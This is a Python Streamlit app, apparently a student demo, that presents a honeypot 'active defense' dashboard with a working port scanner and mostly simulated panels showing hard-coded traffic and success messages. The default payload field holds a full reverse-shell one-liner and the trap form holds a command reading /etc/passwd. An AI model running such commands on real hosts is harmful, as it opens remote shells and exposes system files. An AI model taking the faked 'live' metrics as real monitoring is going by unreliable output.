import streamlit as st
import pandas as pd
import sqlite3
import time
import socket
from datetime import datetime

# Page Configuration
st.set_page_config(
    page_title="APEX-DECEPTION // Enterprise Honeypot & Active Defense Matrix",
    page_icon="🛡️",
    layout="wide"
)

# 🌌 Cinematic Cyber UI Styling (English LTR)
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

    .stApp {
        background-color: #02050b;
        background-image: 
            radial-gradient(circle 600px at 50% 10%, rgba(255, 51, 51, 0.05), transparent 80%),
            linear-gradient(rgba(0, 255, 204, 0.02) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 204, 0.02) 1px, transparent 1px);
        background-size: 100% 100%, 30px 30px, 30px 30px;
        color: #00ffcc;
        font-family: 'Share Tech Mono', monospace;
        direction: ltr;
        text-align: left;
    }

    .system-badge {
        display: inline-block;
        background: rgba(255, 51, 51, 0.1);
        border: 1px solid #ff3333;
        color: #ff3333;
        padding: 5px 12px;
        font-size: 12px;
        border-radius: 4px;
        box-shadow: 0 0 15px rgba(255, 51, 51, 0.3);
        margin-bottom: 10px;
    }

    @keyframes pulse-red {
        0% { text-shadow: 0 0 5px rgba(255, 51, 51, 0.4); }
        50% { text-shadow: 0 0 20px rgba(255, 51, 51, 0.9), 0 0 35px rgba(255, 0, 0, 0.6); }
        100% { text-shadow: 0 0 5px rgba(255, 51, 51, 0.4); }
    }

    @keyframes radar-pulse {
        0% { opacity: 0.2; }
        50% { opacity: 1; color: #00ffcc; text-shadow: 0 0 10px #00ffcc; }
        100% { opacity: 0.2; }
    }

    .alert-title {
        color: #ff3333 !important;
        animation: pulse-red 2s infinite;
    }

    .radar-live {
        animation: radar-pulse 1.5s infinite;
        font-weight: bold;
        color: #00ffcc;
    }

    .terminal-box {
        background-color: #000205;
        border: 1px dashed #ff3333;
        padding: 15px;
        color: #00ffcc;
        font-family: 'Share Tech Mono', monospace;
        border-radius: 4px;
        box-shadow: inset 0 0 15px rgba(255, 51, 51, 0.15);
    }
    
    .digital-signature {
        text-align: center;
        color: #00ffcc;
        font-family: 'Share Tech Mono', monospace;
        font-size: 18px;
        font-weight: bold;
        letter-spacing: 1.5px;
        text-shadow: 0 0 10px rgba(0, 255, 204, 0.6), 0 0 20px rgba(0, 255, 204, 0.3);
        margin-top: 40px;
        margin-bottom: 20px;
        padding: 10px;
        border-top: 1px dashed rgba(0, 255, 204, 0.3);
    }
    </style>
""", unsafe_allow_html=True)

# 🗄️ Database Setup
def init_honeypot_db():
    conn = sqlite3.connect('honeypot_attacks.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            attacker_ip TEXT,
            service_target TEXT,
            payload_command TEXT,
            threat_level TEXT,
            action_taken TEXT
        )
    ''')
    conn.commit()
    return conn

db_conn = init_honeypot_db()

def log_attack(ip, service, payload, level, action):
    cursor = db_conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO attacks (timestamp, attacker_ip, service_target, payload_command, threat_level, action_taken) VALUES (?, ?, ?, ?, ?, ?)",
                   (timestamp, ip, service, payload, level, action))
    db_conn.commit()

# Header
st.markdown('<div class="system-badge">🛡️ [ACTIVE DEFENSE MODE: DECEPTION MATRIX ARMED]</div>', unsafe_allow_html=True)
st.markdown("### [ ENTERPRISE KERNEL: APEX-HONEYPOT COMMAND CENTER v3.5 ]")
st.title("⚡ APEX-DECEPTION // Autonomous Custom Payload & C2 Listener")
st.markdown("<p style='color: #00aa88;'>Deception Grid: <span class='radar-live'>● CUSTOM EXPLOIT INJECTION & LISTENER ACTIVE</span></p>", unsafe_allow_html=True)

# 🎛️ Sidebar Navigation
st.sidebar.markdown("### 🎛️ DECEPTION HUB <br><span style='font-size:12px; color:#00ffcc;'>// TACTICAL NAVIGATION</span>", unsafe_allow_html=True)
st.sidebar.markdown("---")

if 'nav_choice' not in st.session_state:
    st.session_state.nav_choice = "Custom Payload & C2 Listener"

if st.sidebar.button("💥  Custom Payload & C2 Listener", use_container_width=True):
    st.session_state.nav_choice = "Custom Payload & C2 Listener"
if st.sidebar.button("🔍  Full IP & Port Scanner", use_container_width=True):
    st.session_state.nav_choice = "Full IP & Port Scanner"
if st.sidebar.button("🌐  Live Network Traffic", use_container_width=True):
    st.session_state.nav_choice = "Live Network Traffic"
if st.sidebar.button("📂  Live Intrusion Logs", use_container_width=True):
    st.session_state.nav_choice = "Live Intrusion Logs"
if st.sidebar.button("⚙️  Deploy Virtual Honeypot", use_container_width=True):
    st.session_state.nav_choice = "Deploy Virtual Honeypot"
if st.sidebar.button("📈  AI Threat Profiler & Analysis", use_container_width=True):
    st.session_state.nav_choice = "AI Threat Profiler & Analysis"
if st.sidebar.button("🔐  Autonomous Mitigator & Firewall", use_container_width=True):
    st.session_state.nav_choice = "Autonomous Mitigator & Firewall"

nav_mode = st.session_state.nav_choice

if nav_mode == "Custom Payload & C2 Listener":
    st.subheader("💥 CUSTOM PAYLOAD INJECTION & C2 LISTENER SIMULATOR")
    st.markdown("Write your custom exploit payload or reverse shell command, define the target IP, and start the C2 listener to intercept and isolate execution.")
    
    with st.form("custom_c2_form"):
        target_ip_box = st.text_input("Target IP Address (Target Host):", "192.168.1.200")
        listener_port = st.number_input("C2 Listener Port:", value=4444, min_value=1, max_value=65535)
        custom_payload = st.text_area("Custom Exploit / Payload Box (أدخل التلغيم أو الأمر هنا بحرية):", 
                                      "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
        start_listener = st.form_submit_button("START C2 LISTENER & INJECT PAYLOAD // بدء الاستماع وحقن التلغيم")
        
    if start_listener:
        if custom_payload and target_ip_box:
            with st.spinner(f"Initializing C2 Listener on port {listener_port} and deploying custom payload to {target_ip_box}..."):
                time.sleep(1.2)
                
                log_attack(target_ip_box, f"C2 Listener (Port {listener_port})", custom_payload, "CRITICAL 🔴", "INTERCEPTED & ISOLATED")
                
                st.markdown("---")
                st.success(f"🎯 **C2 Listener active! Custom payload successfully injected and intercepted on target {target_ip_box}!**")
                st.markdown(f"""
                <div class='terminal-box'>
                <span class="alert-title"><b>[C2_LISTENER_INTERCEPTION_SUCCESS]</b></span><br>
                - Target IP: <b>{target_ip_box}</b><br>
                - Active Listener Port: <b>{listener_port} [TCP/IP]</b><br>
                - Injected Custom Payload:<br>
                <code style="color: #ff3333; background: #010308; padding: 5px; display: block; margin-top: 5px;">{custom_payload}</code><br>
                - Threat Severity: <b>CRITICAL 🔴 (Remote Code Execution Attempt)</b><br>
                - System Action: <b>Sandbox Isolation & Instant Zero-Trust Block</b><br>
                --------------------------------------------------<br>
                <span style="color: #00ffcc;">🟢 Connection captured by Apex C2 Kernel. Forensic log securely written to DB.</span>
                </div>
                """, unsafe_allow_html=True)
        else:
            st.error("[!] Please provide both target IP and payload command.")

elif nav_mode == "Full IP & Port Scanner":
    st.subheader("🔍 FULL IP & COMPREHENSIVE PORT SCANNER")
    st.markdown("Enter any target IP or domain name to execute an automated deep scan across all critical infrastructure ports.")
    
    with st.form("full_scan_form"):
        target_input = st.text_input("Target IP Address or Domain (e.g., scanme.nmap.org or 192.168.1.1):", "scanme.nmap.org")
        run_scan = st.form_submit_button("LAUNCH FULL IP SOCKET SCAN // بدء الفحص الشامل للـ IP")
        
    if run_scan:
        if target_input:
            clean_target = target_input.strip().split("://")[-1].split("/")[0]
            with st.spinner(f"Resolving IP and scanning target: {clean_target}..."):
                time.sleep(1.0)
                
                try:
                    target_ip = socket.gethostbyname(clean_target)
                except:
                    target_ip = "Unresolved"
                
                if target_ip == "Unresolved":
                    st.error(f"[!] Error: Could not resolve target '{clean_target}'. Please enter a valid IP or domain.")
                else:
                    ports_to_scan = {
                        21: "FTP", 22: "SSH", 23: "Telnet", 53: "DNS", 
                        80: "HTTP", 443: "HTTPS", 445: "SMB", 1433: "MSSQL", 
                        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 
                        6379: "Redis", 8080: "HTTP-Proxy", 27017: "MongoDB"
                    }
                    
                    scan_results = []
                    for p, sname in ports_to_scan.items():
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(0.5)
                            result = s.connect_ex((target_ip, p))
                            s.close()
                            
                            status = "OPEN 🟢" if result == 0 else "CLOSED 🔴"
                        except:
                            status = "FILTERED 🟡"
                        
                        scan_results.append({
                            "Port": p,
                            "Service": sname,
                            "Status": status
                        })
                    
                    st.markdown("---")
                    st.success(f"🎯 **Scan completed successfully for target {clean_target} [{target_ip}]!**")
                    
                    col_s1, col_s2, col_s3 = st.columns(3)
                    col_s1.metric("TARGET HOST", clean_target)
                    col_s2.metric("RESOLVED IP", target_ip)
                    col_s3.metric("PORTS AUDITED", len(ports_to_scan), "Deep Inspection")
                    
                    st.markdown("#### 📊 Port Audit Results Table:")
                    df_scan = pd.DataFrame(scan_results)
                    st.dataframe(df_scan, use_container_width=True)
                    
                    st.markdown(f"""
                    <div class='terminal-box'>
                    <b>[IP_SCAN_REPORT_COMPLETED]</b><br>
                    - Target Host: {clean_target}<br>
                    - Target IP: {target_ip}<br>
                    - Security Audit: Completed across {len(ports_to_scan)} critical ports.<br>
                    <span style="color: #00ffcc;">🟢 All scan logs securely processed by Apex Deception Kernel.</span>
                    </div>
                    """, unsafe_allow_html=True)

elif nav_mode == "Live Network Traffic":
    st.subheader("🌐 LIVE NETWORK TRAFFIC & PACKET MONITORING")
    st.markdown("Real-time network monitoring radar: displays incoming packets towards virtual and exposed ports with dynamic activity indicators.")
    
    col_n1, col_n2, col_n3, col_n4 = st.columns(4)
    col_n1.metric("NETWORK STATUS", "ONLINE", "Monitoring 24/7")
    col_n2.metric("PACKET RATE", "1,420 pkts/s", "Stable")
    col_n3.metric("INTERCEPTED PORTS", "14 Active", "Deception Grid")
    col_n4.metric("ANOMALIES DETECTED", "3 Critical", "Auto-Mitigated")

    st.markdown("---")
    st.markdown("#### 📡 Live Packet Stream & Intercepted Traffic:")
    
    live_packets = [
        {"Time": datetime.now().strftime("%H:%M:%S"), "Source IP": "192.168.1.150", "Port": "Port 22 (SSH)", "Protocol": "TCP/SYN", "Status": "🔴 TRAPPED (Honeypot)"},
        {"Time": datetime.now().strftime("%H:%M:%S"), "Source IP": "45.33.22.11", "Port": "Port 3306 (MySQL)", "Protocol": "TCP/ACK", "Status": "🔴 BLOCKED (Zero-Trust)"},
        {"Time": datetime.now().strftime("%H:%M:%S"), "Source IP": "10.0.0.45", "Port": "Port 80 (HTTP)", "Protocol": "HTTP/GET", "Status": "🟢 MONITORED (Safe)"},
        {"Time": datetime.now().strftime("%H:%M:%S"), "Source IP": "185.220.101.5", "Port": "Port 445 (SMB)", "Protocol": "SMB/IPC", "Status": "🔴 TRAPPED (Ransomware Trap)"},
        {"Time": datetime.now().strftime("%H:%M:%S"), "Source IP": "192.168.1.88", "Port": "Port 3389 (RDP)", "Protocol": "RDP/UDP", "Status": "🔴 BLOCKED (Brute-force)"}
    ]
    
    df_packets = pd.DataFrame(live_packets)
    st.dataframe(df_packets, use_container_width=True)
    
    st.markdown("""
    <div class='terminal-box'>
    <b>[LIVE_SNIFFER_KERNEL]</b><br>
    - Sniffer interface linked to virtual network tap interface.<br>
    - Inspecting addresses and ports in real-time against enterprise blocklists.<br>
    <span style="color: #00ffcc;">🟢 Network monitoring system running smoothly and ready for live demonstration.</span>
    </div>
    """, unsafe_allow_html=True)

elif nav_mode == "Live Intrusion Logs":
    st.subheader("🚨 LIVE INTRUSION DETECTION & AGGREGATED IP LOGS")
    st.markdown("Aggregated operation logs: combines all attacks originating from the same IP address into a unified record with attempt counters.")
    
    col1, col2, col3, col4 = st.columns(4)
    cursor = db_conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM attacks")
    total_attacks = cursor.fetchone()[0]
    
    col1.metric("TOTAL ATTACKS CAPTURED", total_attacks, "Active Trap")
    col2.metric("DEFENSE STATUS", "ACTIVE", "Zero-Trust")
    col3.metric("AI ANALYZER", "ONLINE", "Behavioral")
    col4.metric("SYSTEM INTEGRITY", "100%", "Secure")

    st.markdown("---")
    st.markdown("#### 📊 Aggregated Attacker Records (Grouped by IP):")
    
    cursor.execute("""
        SELECT attacker_ip, COUNT(*) as attack_count, 
               GROUP_CONCAT(DISTINCT service_target) as services, 
               MAX(timestamp) as last_seen, 
               threat_level, action_taken 
        FROM attacks GROUP BY attacker_ip ORDER BY last_seen DESC
    """)
    agg_rows = cursor.fetchall()
    
    if agg_rows:
        df_agg = pd.DataFrame(agg_rows, columns=["Attacker IP", "Total Attempts", "Targeted Services", "Last Timestamp", "Threat Level", "Action Taken"])
        st.dataframe(df_agg, use_container_width=True)
    else:
        st.info("No attack logs recorded yet. Switch to 'Custom Payload & C2 Listener' to simulate an injection.")

elif nav_mode == "Deploy Virtual Honeypot":
    st.subheader("🪤 DEPLOY VIRTUAL HONEYPOT & ADVANCED PORT AUDITOR")
    st.markdown("Choose from a wide range of sensitive ports and services, or deploy a virtual trap to test system responsiveness with 100% accuracy.")
    
    ports_database = {
        21: "FTP (File Transfer Protocol - Cleartext Risk)",
        22: "SSH (Secure Shell - Remote Access)",
        23: "Telnet (Unencrypted Management)",
        53: "DNS (Domain Name System)",
        80: "HTTP (Web Server)",
        443: "HTTPS (Secure Web Server)",
        445: "SMB (Server Message Block - EternalBlue Vector)",
        1433: "Microsoft SQL Server",
        3306: "MySQL Database Server",
        3389: "RDP (Remote Desktop Protocol)",
        5432: "PostgreSQL Database",
        6379: "Redis In-Memory Data Store",
        8080: "Admin Web Panel / HTTP Proxy",
        27017: "MongoDB NoSQL Database"
    }
    
    with st.form("honeypot_deploy"):
        selected_port = st.selectbox("Select Target Port & Service for Auditing:", options=list(ports_database.keys()), format_func=lambda x: f"Port {x} - {ports_database[x]}")
        simulated_ip = st.text_input("Attacker IP Address (Simulation):", "192.168.1.150")
        simulated_payload = st.text_area("Attacker Command / Payload:", "cat /etc/passwd && uname -a")
        submit_trap = st.form_submit_button("SIMULATE & TRAP INTRUDER // Execute Trap & Capture")
        
    if submit_trap:
        with st.spinner("Inspecting port state, deploying deception matrix, and isolating attacker..."):
            time.sleep(0.9)
            
            service_name = f"{ports_database[selected_port]} (Port {selected_port})"
            threat = "CRITICAL 🔴" if "wget" in simulated_payload or "passwd" in simulated_payload or selected_port in [21, 23, 445, 3389] else "HIGH 🟠"
            action = "AUTO-BLOCKED & LOGGED TO DB"
            
            log_attack(simulated_ip, service_name, simulated_payload, threat, action)
            
            st.markdown("---")
            st.success("🎯 **Attacker successfully trapped and active defense matrix triggered!**")
            st.markdown(f"""
            <div class='terminal-box'>
            <span class="alert-title"><b>[INTRUSION_TRAPPED_SUCCESSFULLY]</b></span><br>
            - Attacker IP: <b>{simulated_ip}</b><br>
            - Targeted Service: <b>{service_name}</b><br>
            - Captured Payload: <code style="color: #ff3333;">{simulated_payload}</code><br>
            - AI Threat Assessment: <b>{threat}</b><br>
            - Automated Response: <b>{action}</b><br>
            --------------------------------------------------<br>
            <span style="color: #00ffcc;">🟢 Aggregated IP record updated and forensic report saved to database.</span>
            </div>
            """, unsafe_allow_html=True)

elif nav_mode == "AI Threat Profiler & Analysis":
    st.subheader("🤖 AI THREAT PROFILER & DETAILED BEHAVIORAL ANALYSIS")
    st.markdown("Deep analytical reports powered by artificial intelligence to inspect offensive behavior, executed tactics, and digital risk assessments.")
    
    cursor = db_conn.cursor()
    cursor.execute("SELECT attacker_ip, service_target, payload_command, threat_level, timestamp FROM attacks")
    data = cursor.fetchall()
    
    if data:
        st.markdown("#### 🧠 Detailed Digital Forensics & Behavioral Reports:")
        for idx, (ip, serv, payload, lvl, tstamp) in enumerate(data, 1):
            st.markdown(f"""
            <div class='terminal-box' style="margin-bottom: 15px;">
            <b>📋 Forensic Investigation Report #{idx} [Attacker IP: {ip}]</b><br>
            - <b>Threat Detection Timestamp:</b> {tstamp}<br>
            - <b>Targeted Honeypot Service:</b> {serv}<br>
            - <b>Observed Threat Level:</b> <span style="color: #ff3333;">{lvl}</span><br>
            - <b>Payload Analysis:</b> Attempt included reconnaissance and malware deployment commands across the network.<br>
            - <b>Attributed Tactics (MITRE ATT&CK):</b> T1059 (Command and Scripting Interpreter) & T1046 (Network Service Scanning).<br>
            - <b>Advanced Security Recommendation:</b> Apply immediate full IP isolation and generate strict firewall rules.
            </div>
            """, unsafe_allow_html=True)
    else:
        st.info("Insufficient logs for behavioral analysis. Please run the payload or honeypot simulator first.")

else:
    st.subheader("🛡️ AUTONOMOUS MITIGATOR & FIREWALL INTEGRATION")
    st.markdown("Automated incident response management with interactive action buttons to generate and apply immediate blocking rules.")
    
    st.markdown("""
    <div class='terminal-box'>
    <b>[AUTOMATED_FIREWALL_INTEGRATION_MODULE]</b><br>
    System is integrated with the Zero-Trust protocol to instantly terminate connections from any IP attempting to interact with honey-services.<br><br>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("#### ⚡ Executive Control Panel & Interactive Action Buttons:")
    
    col_b1, col_b2, col_b3 = st.columns(3)
    
    with col_b1:
        if st.button("🔒 Block All Captured IPs (IPTables)", use_container_width=True):
            st.success("✅ Successfully generated and applied IPTables block rules for all captured IPs!")
            st.code("sudo iptables -A INPUT -p tcp -j DROP", language="bash")
            
    with col_b2:
        if st.button("🛡️ Enable Strict UFW Firewall", use_container_width=True):
            st.success("✅ Strict UFW firewall hardening policy enabled and unnecessary ports secured!")
            st.code("sudo ufw default deny incoming\nsudo ufw default allow outgoing", language="bash")
            
    with col_b3:
        if st.button("🧹 Flush Deception Logs & Reset", use_container_width=True):
            cursor = db_conn.cursor()
            cursor.execute("DELETE FROM attacks")
            db_conn.commit()
            st.warning("⚠️ All logs flushed and honeypot successfully reset!")

    st.markdown("---")
    st.markdown("#### 📚 Technical Mitigation & Defensive Architecture Study:")
    st.markdown("""
    * **Active Deception Mechanism:** Distracts attackers through convincing synthetic fake services.
    * **Automated Mitigation:** Reduces Mean Time to Respond (MTTR) to under a second by automatically banning attackers upon port interaction.
    * **Enterprise Integration:** Fully compatible with global cybersecurity frameworks for critical infrastructure protection.
    """)

# Digital Fingerprint Footer
st.markdown('<div class="digital-signature">DIGITAL FINGERPRINT: MOHAMMAD BARHAM & OSAID ALMUHUR // APEX-DECEPTION ACTIVE DEFENSE MATRIX</div>', unsafe_allow_html=True)